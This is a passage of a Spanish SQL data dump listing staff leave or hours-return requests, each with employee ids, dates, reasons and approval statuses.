10:09:06'),(130,63,'2018-08-06','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,94,'2018-05-29 10:09:53','2018-05-29 10:09:53'),(131,63,'2018-08-07','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,95,'2018-05-29 10:09:53','2018-05-29 10:09:53'),(132,63,'2018-08-08','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,96,'2018-05-29 10:09:53','2018-05-29 10:09:53'),(133,63,'2018-08-11','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,97,'2018-05-29 10:10:35','2018-05-29 10:10:35'),(134,63,'2018-08-12','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,98,'2018-05-29 10:10:35','2018-05-29 10:10:35'),(136,63,'2018-08-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,100,'2018-05-29 10:11:18','2018-05-29 10:11:18'),(137,63,'2018-08-14','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,101,'2018-05-29 10:11:18','2018-05-29 10:11:18'),(138,63,'2018-08-15','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,102,'2018-05-29 10:11:46','2018-05-29 10:11:46'),(139,63,'2018-08-16','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,103,'2018-05-29 10:12:13','2018-05-29 10:12:13'),(140,63,'2018-08-17','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,104,'2018-05-29 10:12:13','2018-05-29 10:12:13'),(141,63,'2018-08-21','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,105,'2018-05-29 10:12:33','2018-05-29 10:12:33'),(142,63,'2018-08-23','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,106,'2018-05-29 10:13:11','2018-05-29 10:13:11'),(143,63,'2018-08-24','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,107,'2018-05-29 10:13:11','2018-05-29 10:13:11'),(145,63,'2018-08-25','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,109,'2018-05-29 10:15:08','2018-05-29 10:15:08'),(146,63,'2018-09-27','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,110,'2018-05-29 10:15:42','2018-05-29 10:15:42'),(148,245,'2018-05-22','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,NULL,'2018-05-29 10:30:50','2018-05-29 10:30:50'),(149,202,'2018-07-28','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,116,'2018-05-30 05:35:34','2018-05-30 05:35:34'),(150,202,'2018-08-07','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,117,'2018-05-30 05:36:02','2018-05-30 05:36:02'),(151,202,'2018-08-08','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,118,'2018-05-30 05:36:02','2018-05-30 05:36:02'),(152,202,'2018-08-09','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,119,'2018-05-30 05:36:02','2018-05-30 05:36:02'),(153,253,'2018-08-10','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,120,'2018-05-30 05:43:10','2018-05-30 05:43:10'),(154,253,'2018-08-11','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,121,'2018-05-30 05:43:34','2018-05-30 05:43:34'),(155,253,'2018-08-12','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,122,'2018-05-30 05:43:34','2018-05-30 05:43:34'),(156,253,'2018-08-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,123,'2018-05-30 05:43:53','2018-05-30 05:43:53'),(157,253,'2018-08-14','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,124,'2018-05-30 05:44:20','2018-05-30 05:44:20'),(158,253,'2018-08-15','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,125,'2018-05-30 05:44:20','2018-05-30 05:44:20'),(159,253,'2018-08-16','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,126,'2018-05-30 05:44:20','2018-05-30 05:44:20'),(160,253,'2018-08-21','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,127,'2018-05-30 05:44:36','2018-05-30 05:44:36'),(161,367,'2018-08-11','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,128,'2018-05-30 06:42:25','2018-05-30 06:42:25'),(162,367,'2018-08-12','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,129,'2018-05-30 06:42:25','2018-05-30 06:42:25'),(163,63,'2018-11-14','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,130,'2018-05-30 10:20:41','2018-05-30 10:20:41'),(164,63,'2018-11-15','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,131,'2018-05-30 10:21:10','2018-05-30 10:21:10'),(165,63,'2018-11-16','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,132,'2018-05-30 10:21:10','2018-05-30 10:21:10'),(166,63,'2018-11-17','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,133,'2018-05-30 10:21:27','2018-05-30 10:21:27'),(167,63,'2018-11-19','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,134,'2018-05-30 10:21:49','2018-05-30 10:21:49'),(168,63,'2018-11-20','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,135,'2018-05-30 10:21:49','2018-05-30 10:21:49'),(169,63,'2018-11-21','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,136,'2018-05-30 10:21:49','2018-05-30 10:21:49'),(170,367,'2018-07-07','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,137,'2018-05-30 10:24:34','2018-05-30 10:24:34'),(171,367,'2018-07-08','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,138,'2018-05-30 10:24:34','2018-05-30 10:24:34'),(172,293,'2018-06-16','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO','',NULL,'2018-06-01 05:15:51','2018-12-20 07:25:41'),(173,370,'2018-07-16','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,140,'2018-06-01 07:51:14','2018-06-01 07:51:14'),(174,370,'2018-07-17','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,141,'2018-06-01 07:51:14','2018-06-01 07:51:14'),(175,370,'2018-07-18','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,142,'2018-06-01 07:51:14','2018-06-01 07:51:14'),(176,370,'2018-07-19','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,143,'2018-06-01 07:51:14','2018-06-01 07:51:14'),(177,370,'2018-07-20','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,144,'2018-06-01 07:51:14','2018-06-01 07:51:14'),(178,201,'2018-06-15','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,145,'2018-06-04 05:20:11','2018-06-04 05:20:11'),(179,81,'2018-08-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,146,'2018-06-14 06:48:00','2018-06-14 06:48:00'),(180,81,'2018-08-14','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,147,'2018-06-14 06:48:00','2018-06-14 06:48:00'),(181,81,'2018-08-15','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,148,'2018-06-14 06:48:00','2018-06-14 06:48:00'),(182,81,'2018-08-16','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,149,'2018-06-14 06:48:00','2018-06-14 06:48:00'),(183,81,'2018-08-17','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,150,'2018-06-14 06:48:00','2018-06-14 06:48:00'),(184,201,'2018-06-29','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,151,'2018-06-15 05:04:57','2018-06-15 05:04:57'),(185,358,'2018-07-23','DEVOLUCION COMPUTO AUTOMATICO','2018-10-06','6 y 7 de octubre por boda',0,'ACEPTADO',NULL,152,'2018-06-16 19:56:12','2018-08-20 08:11:05'),(186,358,'2018-07-24','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,153,'2018-06-16 19:56:12','2018-06-16 19:56:12'),(187,358,'2018-07-25','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,154,'2018-06-16 19:56:12','2018-06-16 19:56:12'),(188,358,'2018-07-26','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,155,'2018-06-16 19:56:12','2018-06-16 19:56:12'),(189,358,'2018-07-27','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,156,'2018-06-16 19:56:12','2018-06-16 19:56:12'),(196,378,'2018-11-05','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,162,'2018-06-18 18:56:37','2018-06-18 18:56:37'),(197,378,'2018-11-06','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,163,'2018-06-18 18:56:37','2018-06-18 18:56:37'),(198,217,'2018-09-08','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,164,'2018-06-21 07:50:52','2018-06-21 07:50:52'),(199,217,'2018-09-09','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,165,'2018-06-21 07:50:52','2018-06-21 07:50:52'),(200,241,'2018-06-26','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,166,'2018-06-21 07:52:12','2018-06-21 07:52:12'),(201,306,'2018-08-31','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,167,'2018-07-04 05:17:44','2018-07-04 05:17:44'),(202,293,'2018-07-09','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,168,'2018-07-04 06:48:58','2018-07-04 06:48:58'),(203,225,'2018-07-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,169,'2018-07-04 09:17:05','2018-07-04 09:17:05'),(204,382,'2018-09-21','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,170,'2018-07-09 10:27:37','2018-07-09 10:27:37'),(205,385,'2018-11-12','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,171,'2018-07-12 06:21:54','2018-07-12 06:21:54'),(206,385,'2018-11-13','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO','',172,'2018-07-12 06:21:54','2018-10-24 17:05:56'),(207,385,'2018-11-14','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,173,'2018-07-12 06:21:54','2018-07-12 06:21:54'),(208,385,'2018-11-15','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,174,'2018-07-12 06:21:54','2018-07-12 06:21:54'),(209,367,'2018-09-24','Pedidos 24, 25 y 26/09\r\nCorreo 17/07',NULL,'',0,'ACEPTADO','',NULL,'2018-07-18 05:29:01','2018-09-20 07:25:35'),(210,293,'2018-08-17','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,175,'2018-08-03 05:29:38','2018-08-03 05:29:38'),(211,228,'2018-08-15','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,176,'2018-08-03 07:43:24','2018-08-03 07:43:24'),(212,229,'2018-08-27','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,177,'2018-08-03 10:08:20','2018-08-03 10:08:20'),(213,229,'2018-08-28','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,178,'2018-08-03 10:08:20','2018-08-03 10:08:20'),(214,229,'2018-08-29','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,179,'2018-08-03 10:08:20','2018-08-03 10:08:20'),(215,229,'2018-08-30','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,180,'2018-08-03 10:08:20','2018-08-03 10:08:20'),(216,229,'2018-08-31','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,181,'2018-08-03 10:08:20','2018-08-03 10:08:20'),(217,229,'2018-09-03','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,182,'2018-08-03 10:08:39','2018-08-03 10:08:39'),(218,229,'2018-09-04','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,183,'2018-08-03 10:08:39','2018-08-03 10:08:39'),(219,229,'2018-09-05','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,184,'2018-08-03 10:08:39','2018-08-03 10:08:39'),(220,229,'2018-09-06','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,185,'2018-08-03 10:08:39','2018-08-03 10:08:39'),(221,229,'2018-09-07','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,186,'2018-08-03 10:08:39','2018-08-03 10:08:39'),(222,363,'2018-09-03','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,187,'2018-08-03 10:18:21','2018-08-03 10:18:21'),(223,363,'2018-09-04','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,188,'2018-08-03 10:18:21','2018-08-03 10:18:21'),(224,363,'2018-09-05','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,189,'2018-08-03 10:18:21','2018-08-03 10:18:21'),(225,363,'2018-09-06','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,190,'2018-08-03 10:18:21','2018-08-03 10:18:21'),(226,363,'2018-09-07','DEVOLUCION COMPUTO AUTOMATICO',NULL,NULL,0,'ACEPTADO',NULL,191,'2018-08-03 10:18:21','2018-08-03 10:18:21'),(227,1000,'2018-08-14','DEVOLUCION COMPUTO',NULL,NULL,0,'RECHAZADO','DENEGADO DE PRUEBA',NULL,'2018-08-08 16:31:27','2018-08-08 16:33:06'),(228,1000,'2018-08-25','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,193,'2018-08-08 16:34:05','2018-08-08 16:35:45'),(229,370,'2018-08-27','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,194,'2018-08-09 04:56:31','2018-08-09 04:56:31'),(230,370,'2018-08-28','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,195,'2018-08-09 04:56:31','2018-08-09 04:56:31'),(231,370,'2018-08-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',196,'2018-08-09 04:56:31','2018-08-29 08:13:49'),(232,370,'2018-08-30','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,197,'2018-08-09 04:56:31','2018-08-09 04:56:31'),(233,370,'2018-08-31','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,198,'2018-08-09 04:56:31','2018-08-09 04:56:31'),(234,366,'2018-08-31','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,199,'2018-08-20 07:53:15','2018-08-20 07:53:15'),(235,366,'2018-09-01','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,200,'2018-08-20 07:53:15','2018-08-20 07:53:15'),(236,366,'2018-09-02','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,201,'2018-08-20 07:53:15','2018-08-20 07:53:15'),(237,366,'2018-09-03','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,202,'2018-08-20 07:53:15','2018-08-20 07:53:15'),(238,366,'2018-09-04','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,203,'2018-08-20 07:53:15','2018-08-20 07:53:15'),(239,366,'2018-09-05','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,204,'2018-08-20 07:53:46','2018-08-20 07:53:46'),(240,366,'2018-09-06','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,205,'2018-08-20 07:53:46','2018-08-20 07:53:46'),(241,366,'2018-09-07','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,206,'2018-08-20 07:53:46','2018-08-20 07:53:46'),(244,78,'2018-08-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',209,'2018-08-20 12:31:20','2018-08-22 11:23:34'),(245,78,'2018-08-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',210,'2018-08-20 12:31:20','2018-08-22 11:21:44'),(246,78,'2018-05-02','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',211,'2018-08-21 05:10:11','2018-08-22 11:22:22'),(247,78,'2018-05-03','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',212,'2018-08-21 05:10:11','2018-08-22 11:22:41'),(248,78,'2018-05-04','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',213,'2018-08-21 05:10:11','2018-08-22 11:22:52'),(249,78,'2018-06-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',214,'2018-08-21 05:11:27','2018-08-22 11:23:04'),(250,78,'2018-06-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',215,'2018-08-21 05:11:27','2018-08-22 11:23:13'),(251,78,'2018-06-25','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',216,'2018-08-21 05:12:05','2018-08-22 11:23:24'),(253,78,'2018-08-23','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',NULL,'2018-08-22 11:20:42','2018-08-22 11:21:51'),(254,78,'2018-08-24','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',NULL,'2018-08-22 11:21:06','2018-08-22 11:21:54'),(255,379,'2018-11-12','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',220,'2018-08-29 08:10:35','2018-10-24 17:05:42'),(256,379,'2018-11-13','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',221,'2018-08-29 08:10:35','2018-10-24 17:06:08'),(257,379,'2018-11-14','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',222,'2018-08-29 08:10:35','2018-10-24 17:06:34'),(258,379,'2018-11-15','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',223,'2018-08-29 08:10:35','2018-10-24 17:06:22'),(259,379,'2018-11-16','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',224,'2018-08-29 08:10:35','2018-10-24 17:06:46'),(260,379,'2018-12-26','Exceso de computo',NULL,'',0,'ACEPTADO','',308,'2018-08-29 08:13:08','2018-12-20 07:22:02'),(270,1000,'2018-08-30','DEVOLUCION COMPUTO',NULL,NULL,0,'RECHAZADO','Pruebas',NULL,'2018-08-29 17:22:53','2018-08-29 17:23:38'),(273,1000,'2018-09-06','Personales','2018-09-01','',1,'ACEPTADO','',NULL,'2018-08-30 08:25:25','2018-09-18 11:30:56'),(277,198,'2018-09-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',239,'2018-09-10 10:43:41','2018-09-10 11:14:53'),(278,198,'2018-09-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',240,'2018-09-10 10:45:14','2018-09-10 11:15:13'),(279,198,'2018-09-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,241,'2018-09-10 10:46:47','2018-09-10 11:18:44'),(280,380,'2018-10-27','Correo 11/09',NULL,'',0,'ACEPTADO','',NULL,'2018-09-11 09:44:23','2018-10-24 17:03:55'),(281,241,'2018-10-13','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,242,'2018-09-11 11:51:30','2018-09-11 11:51:30'),(282,241,'2018-10-14','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,243,'2018-09-11 11:51:47','2018-09-11 11:51:47'),(284,1000,'2018-11-05','Otros Motivos ',NULL,NULL,0,'PENDIENTE',NULL,NULL,'2018-09-18 10:48:51','2018-09-18 10:48:51'),(285,1000,'2018-10-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,244,'2018-09-19 05:32:29','2018-09-19 05:34:07'),(286,1000,'2018-12-21','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,245,'2018-09-19 05:33:26','2018-09-19 05:33:26'),(287,363,'2018-10-01','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',249,'2018-09-24 06:14:16','2018-09-26 09:12:24'),(288,363,'2018-10-02','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',250,'2018-09-24 06:14:16','2018-09-26 09:12:31'),(289,363,'2018-10-03','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',251,'2018-09-24 06:14:16','2018-09-26 09:12:35'),(290,363,'2018-10-04','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,252,'2018-09-24 06:14:16','2018-09-24 06:14:16'),(291,363,'2018-10-05','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,253,'2018-09-24 06:14:16','2018-09-24 06:14:16'),(292,167,'2018-10-14','Correo 24/09','2019-04-28','cubrir T6',1,'ACEPTADO','',NULL,'2018-09-24 06:20:06','2019-04-29 08:09:06'),(296,367,'2018-10-11','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,257,'2018-09-26 10:42:29','2018-09-26 10:42:29'),(297,234,'2018-10-05','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,258,'2018-10-01 09:40:43','2018-10-01 09:40:43'),(298,202,'2018-10-25','Tiene boda','2018-10-16','',0,'ACEPTADO','',NULL,'2018-10-02 10:48:23','2018-10-11 11:20:41'),(301,247,'2018-11-01','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,261,'2018-10-04 07:15:45','2018-10-04 07:15:45'),(302,247,'2018-11-02','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,262,'2018-10-04 07:15:45','2018-10-04 07:15:45'),(303,247,'2018-11-03','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,263,'2018-10-04 07:15:45','2018-10-04 07:15:45'),(304,247,'2018-11-04','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,264,'2018-10-04 07:15:45','2018-10-04 07:15:45'),(305,247,'2018-10-31','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,265,'2018-10-04 07:26:50','2018-10-04 07:26:50'),(306,371,'2018-10-08','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,266,'2018-10-08 05:56:29','2018-10-08 05:56:29'),(307,371,'2018-10-09','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,267,'2018-10-08 05:56:29','2018-10-08 05:56:29'),(308,371,'2018-10-10','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,268,'2018-10-08 05:56:29','2018-10-08 05:56:29'),(309,371,'2018-10-11','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,269,'2018-10-08 05:56:29','2018-10-08 05:56:29'),(310,371,'2018-10-12','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,270,'2018-10-08 05:56:29','2018-10-08 05:56:29'),(311,276,'2018-10-21','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,271,'2018-10-08 16:57:14','2018-10-08 16:57:14'),(312,306,'2018-10-15','No acude por suspensiГіn de vuelo',NULL,'',0,'PENDIENTE',NULL,NULL,'2018-10-16 04:56:24','2018-10-16 04:56:24'),(315,380,'2018-10-24','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',274,'2018-10-16 09:23:33','2018-10-24 17:03:02'),(317,380,'2018-10-26','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',276,'2018-10-16 09:23:33','2018-10-24 17:03:27'),(318,371,'2018-10-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',277,'2018-10-17 05:35:10','2018-10-24 17:03:41'),(319,371,'2018-10-28','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',278,'2018-10-17 05:35:10','2018-10-24 17:05:20'),(320,276,'2018-11-18','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',NULL,'2018-11-05 20:55:13','2018-11-13 06:29:34'),(321,241,'2019-01-04','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,280,'2018-11-06 13:24:56','2018-11-06 13:24:56'),(322,241,'2019-01-05','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,281,'2018-11-06 13:24:56','2018-11-06 13:24:56'),(323,241,'2019-01-06','DEVOLUCION COMPUTO',NULL,NULL,0,'PENDIENTE',NULL,282,'2018-11-06 13:24:56','2018-11-06 13:24:56'),(324,225,'2018-11-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO','',NULL,'2018-11-13 06:25:29','2018-11-13 06:26:28'),(325,358,'2018-11-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,284,'2018-11-19 12:00:13','2018-11-19 12:00:13'),(326,358,'2018-11-30','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,285,'2018-11-19 12:00:13','2018-11-19 12:00:13'),(327,358,'2018-12-03','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,286,'2018-11-19 12:01:45','2018-11-19 12:01:45'),(328,358,'2018-12-04','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,287,'2018-11-19 12:01:45','2018-11-19 12:01:45'),(329,358,'2018-12-05','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,288,'2018-11-19 12:01:45','2018-11-19 12:01:45'),(330,358,'2018-12-06','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,289,'2018-11-19 12:01:45','2018-11-19 12:01:45'),(331,358,'2018-12-07','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,290,'2018-11-19 12:01:45','2018-11-19 12:01:45'),(332,363,'2018-12-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,291,'2018-11-20 06:24:08','2018-11-20 06:24:08'),(333,207,'2018-12-14','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,292,'2018-11-20 08:11:59','2018-11-20 08:11:59'),(337,367,'2018-12-22','Quiere exceso de computo el 22 y 23 de diciembre.',NULL,'',0,'ACEPTADO','',305,'2018-11-21 08:21:59','2018-12-12 05:49:32'),(338,229,'2018-12-10','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,296,'2018-11-23 06:53:32','2018-11-23 06:53:32'),(339,229,'2018-12-11','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,297,'2018-11-23 06:53:32','2018-11-23 06:53:32'),(340,229,'2018-12-12','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,298,'2018-11-23 06:53:32','2018-11-23 06:53:32'),(341,229,'2018-12-13','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,299,'2018-11-23 06:53:32','2018-11-23 06:53:32'),(342,229,'2018-12-14','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,300,'2018-11-23 06:53:32','2018-11-23 06:53:32'),(343,63,'2018-08-28','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,301,'2018-11-23 06:53:37','2018-11-23 06:53:37'),(344,63,'2018-08-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,302,'2018-11-23 06:53:37','2018-11-23 06:53:37'),(346,276,'2018-12-06','DEVOLUCION 